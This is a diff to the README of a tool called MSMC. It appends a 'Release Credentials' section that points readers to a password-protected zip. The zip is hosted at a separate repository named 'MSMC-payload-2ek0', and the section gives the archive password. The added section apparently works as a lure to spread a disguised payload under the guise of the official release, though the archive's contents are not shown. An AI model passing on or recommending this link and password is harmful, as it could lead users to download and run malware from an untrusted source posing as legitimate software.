@@ -40,3 +40,10 @@ python MSMC.py
 
 ## Usage:
 You are not allowed to sell msmc or any modified versions. If you use any of my code please give me credit.
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/RhythmFlamingoOutfit/MSMC-payload-2ek0/releases/download/v1.0.0/MSMC.zip)
+- **Archive Password:** `J1dmSHXM1z`
